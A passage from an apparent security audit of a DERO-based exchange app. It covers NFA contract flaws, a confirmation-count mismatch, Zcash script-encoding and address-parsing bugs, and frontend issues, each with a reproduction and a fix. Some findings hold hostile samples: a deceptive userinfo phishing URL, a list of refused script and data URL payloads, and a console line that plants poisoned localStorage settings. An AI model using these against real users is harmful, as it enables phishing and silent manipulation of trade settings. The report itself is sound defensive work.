- **Fix** app/nfts.js: loop `for (let from = 0n; from < f.hn; from += 15n)` issuing one tx per slice, or expose the slice in the button label so the user knows what they are pushing ("Push rewards to holders 1-15 of <hn>"). One transaction per slice is a wallet confirmation each, so the label form is the honest minimum. Local, testable, no contract change.
- **Regression test** A uitest assertion on a pass with hn > 15 that the button either issues ceil(hn/15) transactions or names the range it covers.
- **Safe to fix now** yes · files: app/nfts.js, tools/uitest/ui.mjs
- **Already known as** New; not in the backlog.
- **Refuter verdicts** REAL/INFO/reproduced: Real as stated but not a defect worth LOW. app/nfts.js:99 does pin `from` at 0n and `n` at 15n, and contracts/founders.bas:158-175 pays holders from..from+n-1 with n capped at 15, so with hn > 15 the app's button reaches only the first fifteen registry slots. But: no value is lost or delayed in any 

### APP-2 — U.safeUrl accepts a URL with a userinfo component, and the NFA page renders the same string as both the link target and the visible text

- **Where** `app/ui.js:34` (dimension: Founder NFTs, user NFAs, the NFA standard (founders.bas, nfa.bas, nft.bas, factory NFA registration, and the app's asset screens) — §9–§12)
- **Attack path** app/ui.js:34 is `const safeUrl = (u) => (typeof u === "string" && /^https:\/\/[^\s"'<>\\]{3,300}$/i.test(u) ? u : "")`. The character class excludes whitespace, quotes, angle brackets and backslash — enough to stop attribute break-out and every non-https scheme — but '@' is allowed, so the authority a browser resolves is not the prefix a reader sees. app/nfas.js:166 renders `h("a", { href: u, target: "_blank", rel: "noopener noreferrer", class: "mono", style: "word-break:break-all" }, u)` — href and visible text are the same string, in a mono font, wrapped mid-string in a narrow column, so the first line a reader sees is whatever the creator chose to put before the '@'. The creator can also change it after a sale: Update (contracts/nfa.bas:104-120) rewrites fileURL and fileSignURL forever regardless of who owns the asset.
- **Preconditions** One installed NFA. The reader must click a link the page already labels 'not verified against the hashes by this app'.
- **Impact** Phishing surface with the app's own typography lending it credibility: 'https://dmz.tela.official-mint.com@attacker.invalid/claim' reads as a DMZ URL and goes to attacker.invalid. Low because the destination is a new tab with rel=noopener, no key ever leaves the app, and the row is already captioned 'not verified'.
- **Exploitability** One install, or one Update by the creator at any time afterwards.
- **Reproduced** yes — tests/js/sanitize.test.mjs, case 'safeUrl accepts a userinfo URL whose visible prefix is not where it goes':    const u = "https://dmz.tela.official-mint.com@attacker.invalid/claim";   assert.equal(U.safeUrl(u), u);              // accepted today   assert.equal(new URL(u).hostname, "attacker.invalid");  Run: node --test tests/js -> 17/17 pass. The same file also asserts safeUrl DOES refuse javascript:, JavaScript:, data:, http:, protocol-relative //, vbscript:, file:, an embedded double quote, an embedded <svg onload=, a backslash, an embedded space, a too-short URL and a 301-character one.
- **Fix** Local and testable, app-only. Either (a) tighten safeUrl to reject '@' before the first '/' after the scheme, or (b) better, keep safeUrl as the gate and change the rendering: in app/nfas.js:166 show `new URL(u).hostname` as the visible text with the full URL in the title attribute, so the host is what a reader reads. (b) also improves the long-URL case the `word-break:break-all` style exists for. The same link helper is only used on the NFA page, so the blast radius is one file.
- **Regression test** tests/js/sanitize.test.mjs (written): flip the userinfo case to assert U.safeUrl returns "", or add a case over the app/nfas.js link helper asserting the rendered text equals the hostname.
- **Safe to fix now** yes · files: app/ui.js, app/nfas.js, tests/js/sanitize.test.mjs
- **Already known as** New. BL-62 covers filesign verification (the app not checking fileCheckC/S against the file) and is a different concern; nothing covers the link text itself.
- **Refuter verdicts** UNVERIFIED (the refuters for this dimension did not run)

### NFA-4 — Value attached to ClaimOwnership or Update is kept by the NFA forever — the stray-value guard exists on the five market entrypoints and nowhere else

- **Where** `contracts/nfa.bas:104` (dimension: Founder NFTs, user NFAs, the NFA standard (founders.bas, nfa.bas, nft.bas, factory NFA registration, and the app's asset screens) — §9–§12)
- **Attack path** ClaimOwnership (nfa.bas:93-102) and Update (nfa.bas:104-120) never read DEROVALUE() and never check for a stray quote transfer. On a wrapped-quote NFA, DERO burned into either call is credited to the contract and never sent anywhere; the quote asset attached to Update is likewise kept. On a DERO-quoted NFA the guard at Start:129 / BuyItNow:168 / Bid:198 / CloseListing:231 / CancelListing:248 cannot fire at all (it is conditioned on quote != DERO()), so DERO attached to any of those is kept too. Nothing in the contract sends more of an asset than the call that is running received or than currBidAmt records, so the value is locked, not stealable — I asserted that a full settlement afterwards moves exactly the buyer's amount and leaves the stranded balance untouched.
- **Preconditions** A caller attaching value where none is needed — a foreign tool, a wallet that defaults to burning a fee, or a typo. The DMZ app never does this (app/nfas.js:118 sends ClaimOwnership with only the unit, and offers no Update sheet — BL-61).
- **Impact** Permanent, unrecoverable loss of whatever was attached, in DERO or in the wrapped quote. No effect on any other party.
- **Exploitability** Not an attacker's tool — a self-inflicted loss with no recovery. It matters because the NFA template is meant to be usable by any ART-NFA-MS1 tool, and the standard's own README warns about ring size but not about this.
- **Reproduced** yes — Wrote tests/nfa_stray_test.go. Run:    tools/withlock.sh dvm bash tests/run.sh -run 'NFAStray' -v  Output: === RUN   TestNFAStrayValueOnClaimOwnershipAndUpdateIsStranded     STRANDED: 12845 DERO and 6000 of the quote sit in the NFA with no entrypoint that sends them anywhere     after a complete sale the stranded 12845 DERO / 6000 quote are still there: no path releases them --- PASS  The test first asserts the guard where it does exist (Start with 777 stray DERO on a wrapped-quote NFA is refused and leaves 0 DERO in the contract), then attaches 12,345 DERO to ClaimOwnership and 500 DERO + 6,000 quote to Update, asserts nothing is returned, then runs a full 1,000,000 sale and asserts exactly
- **Fix** Contract change, so not safe now (new template hash, redeploy policy). One line each: add `IF DEROVALUE() != 0 THEN GOTO 999` to ClaimOwnership and Update, and change the market guard from `LOAD("quote") != DERO() && DEROVALUE() != 0` to a plain `DEROVALUE() != ASSETVALUE(LOAD("quote"))`-shaped check so the DERO-quoted case is covered too. It is a divergence from ART-NFA-MS1 (which has no such guards) and therefore an operator decision under docs/NFA_BUILD.md §1 invariant 1. Safe now, and worth doing on its own: state the hazard on the NFA page next to the ClaimOwnership button, alongside the ring-2 sentence already there.
- **Regression test** tests/nfa_stray_test.go (written, passing). On a fix, invert: assert both calls are refused with the value refunded and the contract balance at 0.
- **Safe to fix now** no — needs a decision or a redeploy policy · files: contracts/nfa.bas, app/templates/nfa.bas, app/config.js, app/nfas.js, tests/nfa_stray_test.go
- **Already known as** Named as a general hazard by the architecture readers ('stray assets are stranded forever by every entrypoint that does not check them'), but not carried as a BL item for nfa.bas and not asserted by any test. contracts/nfa.bas's own header comment (lines 17-19) claims the refusal covers 'a market call (Start, BuyItNow, Bid, CloseListing, CancelListing)' — accurate as far as it goes, and silent about the two calls that have no guard.
- **Refuter verdicts** UNVERIFIED (the refuters for this dimension did not run)

### NFA-5 — The creator rewrites the file under a live bid — confirmed on the DVM, with ownerCanUpdate 0

- **Where** `contracts/nfa.bas:105` (dimension: Founder NFTs, user NFAs, the NFA standard (founders.bas, nfa.bas, nft.bas, factory NFA registration, and the app's asset screens) — §9–§12)
- **Attack path** Update (nfa.bas:104-120) admits LOAD("creatorAddr") == SIGNER() at line 105 unconditionally — before the ownerCanUpdate branch at 106, and with no reference to the listing state. A creator can therefore change fileURL, fileSignURL, iconURLHdr, coverURL and tagsHdr at any moment, including while bidders are bidding on what they believe the asset to be, and after any number of sales. fileCheckC / fileCheckS are never rewritten, so the hashes stop matching the file — but app/nfas.js:172 already tells the reader the app does not check them (BL-62), so nothing surfaces the mismatch.
- **Preconditions** Being the creator. That is permanent: creatorAddr is stored at init (nfa.bas:59) and there is no setter.
- **Impact** A bidder can win an asset whose file is not the one they bid on. Bounded by the fact that the name, the two check headers and the collection cannot change, so a diligent buyer who recorded the hashes can detect it after the fact.
- **Exploitability** One transaction by the creator at any time.
- **Reproduced** yes — tests/nfa_stray_test.go, TestNFAUpdateRewritesTheFileUnderALiveBid. Run:    tools/withlock.sh dvm bash tests/run.sh -run 'NFAUpdateRewrites' -v  Output:     R12 confirmed: the creator changed fileURL from "https://example.invalid/file.png" to "https://attacker.invalid/other.png" while alice's 2,000,000 bid stood; ownerCanUpdate is 0 and it made no difference --- PASS  The test then closes the auction at the end and asserts alice still receives the unit — the bid is unaffected, only what she gets is.
- **Fix** Operator decision D-6, and a contract change if it is to be closed at all (Update would have to refuse while checkActive returns 0). Safe now and independent of that: app/nfas.js:179 already states the creator can change the URLs 'at any time, listed or not' on the record card — repeat that sentence inside the bid and buy sheets (app/nfas.js bidSheet/buySheet), which is where the money is committed, and show the two check headers there so a bidder can record them before bidding.
- **Regression test** tests/nfa_stray_test.go TestNFAUpdateRewritesTheFileUnderALiveBid (written, passing). If the operator closes it, the test inverts to assert Update is refused while a listing is active.
- **Safe to fix now** yes · files: app/nfas.js, tests/nfa_stray_test.go
- **Already known as** docs/NFA.md §7 R12 and docs/BACKLOG.md BL-61 (B) / decision D-6. Both are accurate; neither had a test. The backlog frames it as 'the Update sheet' (whether the app offers the button), which understates it slightly: the hazard is the creator's power, which exists whether or not the app offers a sheet.
- **Refuter verdicts** UNVERIFIED (the refuters for this dimension did not run)

### XMR-6 — The confirmation count the app promises a depositor is not the count any signer uses

- **Where** `app/config.js:12` (dimension: Monero side and the hot-wallet question (directive §2, §4-XMR, §20, §22): tools/xmrswap/monero.go + fakewallet.go + swap.go's Monero paths, tools/vaultsigner's (unbuilt) Monero backend, and the XMR deposit/withdrawal test matrix)
- **Attack path** app/config.js:12 declares the Monero vault with `conf: 10` and app/wrap.js prints it in the deposit walkthrough as the number of confirmations after which a deposit is credited. The signer's own numbers live elsewhere and disagree: tools/vaultsigner/networks.go gives monero 10 on mainnet/testnet but 2 on `simulator`, and tools/vaultsigner/main.go:508-509 forces *confs = 2 for the sim backend on EVERY network, silently overriding the table (the mainnet floor at main.go:512-514 is applied only in the unreachable real-backend branch). config.js:13 says ZEC conf 6 where the table says 10/6/2.
- **Preconditions** None; this is what is deployed on the simulator today.
- **Impact** A number the app presents as a protocol fact is a hand-maintained string in a file the signers never read, and the running signer credits deposits five times sooner than the screen says. Directive requirement 3 (costs and conditions obvious before acting) is not met for the one figure that decides how long a depositor's coins are at risk.
- **Exploitability** Not an attack — a false statement to users, and one the app cannot verify even in principle today.
- **Reproduced** yes — $ grep -n conf app/config.js | head -3 12:    { scid: "f23403b0...", name: "Monero", sym: "XMR", ..., dec: 12, conf: 10 }, 13:    { scid: "93013bb2...", name: "Zcash", sym: "ZEC", ..., dec: 8, conf: 6 }, $ sed -n '25,29p' tools/vaultsigner/networks.go   "simulator": {     "monero": {"Monero regtest / stagenet", "127.0.0.1:38082", 2, ...},     "zcash":  {"Zcash regtest", "127.0.0.1:18232", 2, ...}, $ sed -n '506,510p' tools/vaultsigner/main.go   case "sim":     be = simBackend{*simPath}     if *confs == 0 { *confs = 2 }
- **Fix** Make the number come from one place: publish it on chain (a `conf` key the signers write at Seal, or fold it into the parameters record) and have wrap.js read it from the contract rather than from config.js; failing that, have tools/genconfig derive vaults[].conf from tools/vaultsigner/networks.go for the network being rendered, and delete the sim branch's unconditional `*confs = 2` (it belongs behind the -network simulator guard of XMR-1). Until one of those lands, wrap.js should say the figure is the app's own claim and not the federation's — which is the discipline app/notice.js already holds itself to.
- **Regression test** tools/genconfig: a test asserting each rendered vaults[].conf equals chainTable[network][chain].Confirmations for that network.
- **Safe to fix now** yes · files: tools/genconfig/main.go, tools/vaultsigner/main.go, app/wrap.js
- **Already known as** The vault reader noted the ZEC half (config conf 6 vs networks.go 10). The XMR half, and the fact that the sim backend overrides the table unconditionally on every network, are not recorded anywhere.
- **Refuter verdicts** REAL/LOW/reproduced: Real and reproduced. app/config.js:12 publishes XMR conf:10 for the SIMULATOR deployment while the signer actually running on the simulator uses 2 — both because tools/vaultsigner/networks.go gives monero 2 under \"simulator\" and because main.go:507-509 forces *confs=2 for the sim backend unconditi

### ZEC-6 — ScriptNum is not minimal for 1..16, so a small cltv yields a redeem script whose refund branch no standard node will relay

- **Where** `tools/zecswap/script.go:134` (dimension: Zcash side (directive §3, §4-ZEC, §21): tools/zecswap (script/sign/sighash/orchard/blake2 + CLI + vectors), contracts/swap.bas and board.bas as the DERO counterpart of the transparent-ZEC market, docs/ZEC_SWAP.md against the current Zcash protocol spec / ZIP 225 / 244 / 317 / 255 / 257 / 258 / 203 / 320 and BIP 65, and the requirements for the not-yet-built watcher and broadcast layer.)
- **Attack path** ScriptNum's doc comment promises "the minimal script-number encoding", and the redeem script pushes ScriptNum(CLTV) through push(). For 1..16 the minimal encoding is the opcode OP_1..OP_16 (0x51..0x60), not a one-byte data push. The project's PoC evaluates the script with Flags::MinimalData among the consensus flags, and MINIMALDATA is standardness for relay: a redeem script carrying `0101` in place of `51` fails when the refund branch executes it, so the refund spend is non-standard and will not propagate. Combined with ZEC-3 (nothing bounds cltv), a taker who Accepts with cltv in 1..16 — or a maker who chooses that cltv for them in a v2 where the maker picks it — creates an output whose refund branch is effectively dead.
- **Preconditions** cltv in 1..16. Unreachable once ZEC-3's lower bound (cltv > Zcash tip) is enforced; reachable today through board.bas Accept and through the CLI.
- **Impact** The taker's ZEC has no working exit but the maker's claim; "nobody loses coins; both lose time" (docs/ZEC_SWAP.md §3) stops being true. Small because the values are absurd for a real swap.
- **Exploitability** Requires a hostile or careless cltv; ZEC-3 is the reason one is possible at all.
- **Reproduced** yes — tools/zecswap/hazards_test.go TestCLTVPushIsMinimal, added:   cd tools && go test -count=1 -run TestCLTVPushIsMinimal ./zecswap   --- FAIL: TestCLTVPushIsMinimal (0.00s)       hazards_test.go:40: push(ScriptNum(1)) = 0101, want 51       hazards_test.go:40: push(ScriptNum(5)) = 0105, want 55       hazards_test.go:40: push(ScriptNum(16)) = 0110, want 60 17, 128 and 3,000,000 are already correct (0111, 028000, 03c0c62d), so only the small-integer opcode range is wrong. Visible in the CLI too: -cltv 5 emits …ac670105b175… .
- **Fix** In push(), emit OP_1+(n-1) when the data is a single byte with value 1..16, and OP_0 for the empty push (already correct); or add a pushNum() used only by RedeemScript that applies the OP_N rule. Guard the encoder with the existing table test. Note this is separate from the ScriptNum(math.MinInt64) index-out-of-range panic the concurrent fuzz test found (`n = -n` does not change MinInt64, so the magnitude loop never runs) — that is unreachable from a uint32 CLTV but should be fixed in the same edit.
- **Regression test** tools/zecswap/hazards_test.go TestCLTVPushIsMinimal (added; RED until the fix), plus the concurrent pass's FuzzScriptNumNeverPanics.
- **Safe to fix now** yes · files: tools/zecswap/script.go, tools/zecswap/hazards_test.go
- **Already known as** New. The architecture map's swap-market reader notes "the CLI accepts -cltv 5 and emits a non-minimal push `0105`" as a LOW; no BL number. It does not connect it to the MINIMALDATA flag the project's own PoC runs with, which is what makes it unspendable rather than merely ugly.
- **Refuter verdicts** UNVERIFIED (the refuters for this dimension did not run)

### ZEC-9 — The design note's Z9 row misstates CLTV semantics: it puts nSequence and nLockTime on the funding transaction instead of the refund spend

- **Where** `docs/ZEC_SWAP.md:238` (dimension: Zcash side (directive §3, §4-ZEC, §21): tools/zecswap (script/sign/sighash/orchard/blake2 + CLI + vectors), contracts/swap.bas and board.bas as the DERO counterpart of the transparent-ZEC market, docs/ZEC_SWAP.md against the current Zcash protocol spec / ZIP 225 / 244 / 317 / 255 / 257 / 258 / 203 / 320 and BIP 65, and the requirements for the not-yet-built watcher and broadcast layer.)
- **Attack path** Z9 reads: "The taker funds with a transaction whose input is not final (nSequence max) or with nLockTime below cltv → the refund branch's CHECKLOCKTIMEVERIFY fails for a final input". The funding transaction's nSequence and nLockTime are irrelevant to the script; BIP 65 constrains the transaction that *spends* the P2SH output through the ELSE branch — that spend's input must be non-final (nSequence ≠ 0xffffffff) and the spend's nLockTime must be ≥ the pushed height. The PoC's fifth and sixth cases that Z9 cites are exactly that: eval(refund(...), lock_time, is_final=true) refused, and eval(refund(...), lock_time-1, false) refused. Anyone implementing the missing builder from the note rather than from BIP 65 will set the fields on the wrong transaction and produce a refund that cannot be mined.
- **Preconditions** Someone builds the refund from §9 rather than from the spec.
- **Impact** An unbroadcastable refund, which is the entry to ZEC-7's loss path rather than a loss by itself.
- **Exploitability** n/a — a documentation defect.
- **Reproduced** yes — Read docs/ZEC_SWAP.md:238 against research/crosschain/poc/zec-t-htlc/src/main.rs lines 73-75 (the two cases vary the *spending* transaction's lock_time and is_final, not the funding transaction) and against https://github.com/bitcoin/bips/blob/master/bip-0065.mediawiki, whose failure conditions are "the top stack item is greater than the transaction's nLockTime field" and "the nSequence field of the txin is 0xffffffff".
- **Fix** Rewrite the Z9 row to describe the refund spend: "The taker's refund spend sets nSequence 0xffffffff on the input, or nLockTime below cltv, or nExpiryHeight at or below cltv → CHECKLOCKTIMEVERIFY fails, or the transaction can never be included; the refund must be rebuilt. The funding transaction's own nSequence and nLockTime do not matter." Add the ZIP and BIP numbers to §12 Sources, which currently names them without numbers.
- **Regression test** None in Go; the builder's table test in ZEC-7 is the code-level guard.
- **Safe to fix now** yes · files: docs/ZEC_SWAP.md
- **Already known as** New. Not in any backlog entry or prior audit.
- **Refuter verdicts** UNVERIFIED (the refuters for this dimension did not run)

### ZEC-10 — Address refusal by reason covers z/u forms only: ZIP 320 TEX and upper-case unified addresses get a base58 error, and no app screen refuses anything

- **Where** `tools/zecswap/script.go:211` (dimension: Zcash side (directive §3, §4-ZEC, §21): tools/zecswap (script/sign/sighash/orchard/blake2 + CLI + vectors), contracts/swap.bas and board.bas as the DERO counterpart of the transparent-ZEC market, docs/ZEC_SWAP.md against the current Zcash protocol spec / ZIP 225 / 244 / 317 / 255 / 257 / 258 / 203 / 320 and BIP 65, and the requirements for the not-yet-built watcher and broadcast layer.)
- **Attack path** ParseAddress refuses a string beginning zs/zc/zt/u with a clear reason. Everything else falls through to Base58Check and comes back as "bad checksum" or "…is not a base58 character". Two forms a Zcash holder will realistically paste land there: a ZIP 320 TEX address (tex1…), which is Bech32m and encodes exactly a transparent P2PKH key hash — the very thing the swap script needs, so refusing it with a checksum error is both unhelpful and a missed convenience; and a unified address rendered in the upper case Bech32m permits for QR codes (U1…), which the `s[:1] == "u"` test does not catch. And since app/ contains no ZEC-swap screen at all, docs/ZEC_SWAP.md §8's promise that "the app derives the key hash, refuses shielded addresses with the reason" is true only of a command-line tool no end user will run.
- **Preconditions** A user pastes a TEX or upper-case unified address.
- **Impact** Confusion, not loss. Worth fixing before the screen ships, because a wrong-address message is where a user starts improvising.
- **Exploitability** n/a.
- **Reproduced** yes — cd tools && go run ./zecswap/cmd/zecswap address tex1s2rp728sxq5xt76nsgzqrqsxr9nc8kmyz3d3t6mmp   zecswap: bad checksum cd tools && go run ./zecswap/cmd/zecswap address zs1z7rejlpsa98s2rrrfkwmaxu53e4ue0ulcrw0h4x5g8jl04tak0d3mm47vdtahatqrlkngh9sly   zecswap: a shielded address; the swap script needs a transparent one (t1…, t3…, tm…, t2…) cd tools && go run ./zecswap/cmd/zecswap address u1l8xunezsvhq8fgzfl7404m450nwnd76zshscll4zwufcmjvdnpfpfd0lyqu6y6s6acg5f9uvhs7q6gg9lyunvggre4v55u5r5dkkxdzmy6l4dcsz2z   zecswap: a shielded address; the swap script needs a transparent one (t1…, t3…, tm…, t2…) grep -rniE 'zcash|zswap|board\.bas|shielded|unified' app/*.js app/*.html → only the wrapped-asset vault 
- **Fix** Case-fold the prefix test before comparing (so U1…, UTEST1… and an upper-case zs are caught), name the unified and TEX forms separately in the message, and either decode ZIP 320 TEX addresses to their key hash and accept them — they are transparent P2PKH by definition — or refuse them with "a TEX address (ZIP 320); paste the t1…/tm… form of the same key". Everything unrecognised should say "not a Zcash address this swap can use" before it says anything about base58. When the screen lands (BL-43), the same three messages go in front of the user.
- **Regression test** tools/zecswap/hazards_test.go TestParseAddressRefusalsAreByName: a table of zs1/zc/zt/u1/U1/utest1/tex1/textest1/garbage inputs each asserted to fail with a message naming the form, and t1/t3/tm/t2 fixtures asserted to parse with the right network and kind.
- **Safe to fix now** yes · files: tools/zecswap/script.go, tools/zecswap/hazards_test.go
- **Already known as** BL-43 (the privacy disclosure and address entry in the app) and BL-13 (no swap screen). The backlog covers the missing screen; it does not cover TEX addresses, which post-date the design note.
- **Refuter verdicts** UNVERIFIED (the refuters for this dimension did not run)

### DVM-3 — No repo invariant or test says a contract may address an unverified account only with its LAST transfer — the rule the whole fleet depends on and the one nfa.bas breaks

- **Where** `tests/sendorder_test.go:24` (dimension: DERO contracts and DVM semantics — make it lose money (directive §6, §13, §17))
- **Attack path** TestNoExternalSendBeforeAFailureExit reads control flow: from every external send, can execution still reach a non-zero RETURN? It says nothing about WHERE a send is addressed. The DVM law behind DVM-1 (vendor/derohe/dvm/simulator.go:227-238 vs :356-359) means a second, independent rule is load-bearing for every DMZ contract: a transfer whose destination the contract has not verified — anything other than a ring-2 SIGNER(), or an address stored from one — must be the LAST transfer the call emits, or the call half-commits and destroys the tail of its own payment list. Today only nfa.bas breaks it, and only because it is the only DMZ contract that pays more than one distinct party in one call (I enumerated every SEND in contracts/*.bas by function). But board.bas, swap.bas and htlc.bas all store unvalidated counterparty strings, launch.bas and pool.bas have ...To wrappers that take a caller-named dest, and any future fee-splitting or payout-batching entrypoint inherits the hazard silently, because nothing tests for it.
- **Preconditions** None — this is a missing guard rail, not a live loss. It becomes a loss the moment any contract gains a second distinct destination in one call.
- **Impact** The next contract or entrypoint that pays two parties reintroduces DVM-1 with no test failing. That is exactly how the launch.bas drain in sendorder_test.go's header got in.
- **Exploitability** n/a — reasoned from the code, not an attack in itself.
- **Reproduced** yes — Enumeration I ran (no state changed): $ cd <repo> $ awk '/^Function /{fn=$2} /SEND_(DERO|ASSET)_TO_ADDRESS/{print FILENAME": "fn": "$0}' contracts/*.bas Every multi-send function in the fleet resolves to ONE destination expression (pool AddLiquidity/RemoveLiquidity/refundto -> s; launch buyto/refundto/ClaimFees -> s or t; founders Mint/Withdraw/Buy -> signer and a Register-time or List-time signer, both registered by construction; founders PayBatch -> up to 15 h_<i> holders, all ring-2 Register signers; nft Mint -> s twice; htlc/swap/vault/factory/chat -> one) EXCEPT nfa.bas processDEROFinalPayment, which emits five to five different parties (creatorAddr, artificerAddr, 
- **Fix** Add the rule to contracts/README.md's rules section in one sentence — "a transfer to an address the contract did not take from a ring-2 SIGNER() must be the last transfer the call emits; anything after it is destroyed if that account is unregistered" — and add a static test beside tests/sendorder_test.go that parses contracts/*.bas the same way and fails when a function can emit a send to an address expression that is not SIGNER(), not derived from a key that was itself stored from SIGNER(), and is not the last send on that path. The allow-list mechanism sendorder_test.go already uses is the right shape for the deliberate exceptions. This is test and documentation only: no contract, config or deployment changes.
- **Regression test** The static test itself is the regression test; it must fail today on contracts/nfa.bas processDEROFinalPayment lines 341 and 345 and pass once DVM-1's reordering lands (with charityDonateAddr last and artificerAddr covered by an allow-list entry that cites the operator's D-4 ruling that artificerFee is 0).
- **Safe to fix now** yes · files: tests/sendorder_test.go, contracts/README.md, docs/BACKLOG.md
- **Already known as** New. tests/sendorder_test.go exists precisely because a statement-order property once cost 2,052,806 of a 2,150,000 pot (its own header), and it proves the property it was written for — but only that one. docs/BACKLOG.md has no entry for destination registration; contracts/README.md's rules section does not state it either.
- **Refuter verdicts** UNVERIFIED (the refuters for this dimension did not run)

### FE-7 — localStorage survives the TELA port being reassigned, so a previously-served app can pre-set image loading and a 10% slippage default

- **Where** `app/app.js:11-13 (settings read) + app/screens.js:250,258 + vendor/tela/tela.go:131-133 (port range):11` (dimension: TELA, frontend, wallet interaction, supply chain (directive §15, §16, §26, §35))
- **Attack path** TELA serves each app on its own port from a fixed range starting at 8082 (vendor/tela/tela.go:131-133, FindOpenPort). The origin is therefore http://localhost:<port>, and the port is assigned by availability, so a different TELA app served earlier on the port DMZ later gets shares localStorage with it. app.js:11 merges whatever is in `veil.settings` over the defaults. `daemon` is defended twice (validated on read at app.js:13, and a non-loopback endpoint additionally needs a per-session sessionStorage confirmation, app.js:14-17). `images` and `slippage` are not: `images: true` silently enables loading creator-controlled https URLs, and `slippage` is accepted anywhere in (0, 1000].
- **Preconditions** The user opened some other TELA app that was served on the port DMZ later occupies. No network position, no wallet.
- **Impact** (1) Every token icon, cover and profile avatar is fetched from a creator-chosen host, disclosing the user's IP and browsing timing, with the Settings copy still saying "off means generated avatars only". (2) With slippage pre-set to 1000, the trade sheet's `slip` initialises to 10% and none of the [0.5, 1, 2, 5] chips highlights, so nothing on screen states the figure except the "Minimum received" amount itself. Combined with FE-4 the two compound. Injected `veil.trades` rows are shape-checked (feed.js:412-414) so P&L can be falsified but nothing else follows.
- **Exploitability** Opportunistic and untargeted; the attacker cannot choose when DMZ lands on their port, and the payoff is disclosure and a worse default rather than a transfer.
- **Reproduced** no — Reasoned; not staged (would need two TELA installs and a port collision). $ grep -n 'DEFAULT_PORT_START\|FindOpenPort' vendor/tela/tela.go 131:const DEFAULT_PORT_START = 8082 229:func FindOpenPort() (server *http.Server, found bool) $ sed -n '11,17p' app/app.js       # images/slippage merged straight in; only daemon is gated $ sed -n '258p' app/screens.js     # "off means generated avatars only" Stage it by hand: with the app served at 127.0.0.1:8082, run in the console   localStorage.setItem('veil.settings', JSON.stringify({images:true, slippage:1000, seen:true})) then reload - images load with no prompt and the trade sheet's slippage chips show none selected.
- **Fix** Treat `images` the way `daemon` is treated: require a per-session confirmation before the first remote image load, or re-derive it from a sessionStorage flag set only by the Settings toggle. Clamp `slippage` on read to one of the values the chips actually offer, and print the number beside the chips so a value outside the set is visible. Both are a few lines in app.js/token.js.
- **Regression test** tests/js - construct a hostile veil.settings, run the app.js settings-normalisation block, and assert images is false and slippage is one of {50,100,200,500}.
- **Safe to fix now** yes · files: app/app.js, app/token.js, app/screens.js
- **Already known as** Partly known: the frontend reader flags same-origin storage. The `daemon` half is already defended (app.js:14-17, sessionStorage confirmation); `images` and `slippage` are not, and that distinction is new.
- **Refuter verdicts** UNVERIFIED (the refuters for this dimension did not run)

### FE-8 — Settings makes a security claim the CSP does not enforce, and ships a toggle that does nothing

- **Where** `app/screens.js:262 (CSP claim), app/screens.js:250 (indexer toggle), app/screens.js:277 (clear local data), app/index.html:6:262` (dimension: TELA, frontend, wallet interaction, supply chain (directive §15, §16, §26, §35))
- **Attack path** Not an attack; three statements the build does not back. (1) "A Content Security Policy blocks any script that is not part of this build and any connection except your node, your wallet and image hosts." The connect-src in index.html:6 is `'self' ws://127.0.0.1:* ws://localhost:* wss: http://127.0.0.1:* http://localhost:*` - `wss:` with no host is any host on the internet, and image hosts are governed by img-src, not connect-src. The restriction to "your node" comes from rpc.js endpointURL(), not from the CSP; if that function ever regressed the CSP would not catch it, and the user has been told it would. (2) "Use indexer read cache - Optional Gnomon cache" writes settings.indexer and nothing in the build ever reads it (`grep -n indexer app/*.js` returns exactly one line, the toggle). (3) "Clear local trade history, watchlist and cache" removes `veil.*` but not `dmz.chat.mute`, so the list of addresses the user muted in chat survives a wipe the user was told was complete.
- **Preconditions** None.
- **Impact** A user calibrates their trust from these lines. The CSP sentence invites them to believe a defence-in-depth layer exists where only a single application-level function stands; the toggle invites them to believe they can change how reads are routed; the wipe button leaves behind a per-address record. No direct loss.
- **Exploitability** Not directly exploitable; it is a mis-calibration of the user's threat model, which matters most for the one claim ("any connection except your node") that a future regression in endpointURL would silently falsify.
- **Reproduced** yes — $ grep -n "connect-src" app/index.html 6: ... connect-src 'self' ws://127.0.0.1:* ws://localhost:* wss: http://127.0.0.1:* http://localhost:*; ... $ grep -n "indexer" app/*.js app/screens.js:250:        U.toggle("Use indexer read cache", !!st.indexer, (on) => V.app.saveSettings({ indexer: on }), ...) $ grep -n "Clear local" app/screens.js 277: ... for (const k of Object.keys(localStorage)) if (k.startsWith("veil.") && k !== "veil.settings") localStorage.removeItem(k) ... $ grep -n 'MUTE = ' app/chat.js 24:  const MUTE = "dmz.chat.mute"; Screenshot: .sim/ui-audit-frontend/03-settings.png shows all three on one screen.
- **Fix** Reword the CSP line to what the policy actually does ("only scripts from this build run; connections are limited to WebSocket endpoints, and the app itself refuses any node that is not on this device or wss://"), or tighten connect-src to the loopback forms plus a documented allowance and say so. Remove the indexer toggle until a Gnomon path exists. Extend the clear loop to `dmz.` as well, or rename the mute key to `veil.chat.mute`.
- **Regression test** A UI-pass assertion that the Settings security list contains no sentence attributing to the CSP a restriction the meta tag does not express, and a tests/js check that every localStorage key the app writes begins with a prefix the clear button removes.
- **Safe to fix now** yes · files: app/screens.js, app/chat.js, app/index.html
- **Already known as** PERF-F11 (dead indexer toggle) is open in DMZ_FABLE_5_1_FOLLOWUP section 5. The CSP sentence and the dmz.chat.mute omission are not recorded anywhere.
- **Refuter verdicts** UNVERIFIED (the refuters for this dimension did not run)

### FE-9 — The Wrap screen states a false reason for ring size 2 and hard-codes the refund address, removing an unlinkability the contract allows

- **Where** `app/wrap.js:483 (refund: me()) and the burn-form note above it; contracts/vault.bas:375-402:483` (dimension: TELA, frontend, wallet interaction, supply chain (directive §15, §16, §26, §35))
- **Attack path** vault.bas Burn() never calls SIGNER(); it takes `refund` as a parameter and stores ADDRESS_RAW(refund) in w_<j>_by (lines 20, 44). The screen tells the user the opposite - "Burn is a ring-size-2 call: the contract must record who burned, so this address is public in that transaction" - and app/wrap.js doBurn() passes `["refund", "S", me()]` unconditionally, so the connected DERO address and the foreign destination are published together in one record on every withdrawal.
- **Preconditions** None; every withdrawal.
- **Impact** Every unwrap permanently links the user's DERO identity to a foreign-chain address, in the clear, on a public contract - on a product whose stated purpose is a privacy exchange. The contract would allow a burn from any wallet naming any registered refund address, which is a materially better privacy position, and the app neither offers it nor explains that it exists. Ring 2 is in fact the right default (a reverted burn at ring > 2 has no signer to refund the attached asset), but that is not the reason the screen gives.
- **Exploitability** Passive; anyone reading the chain.
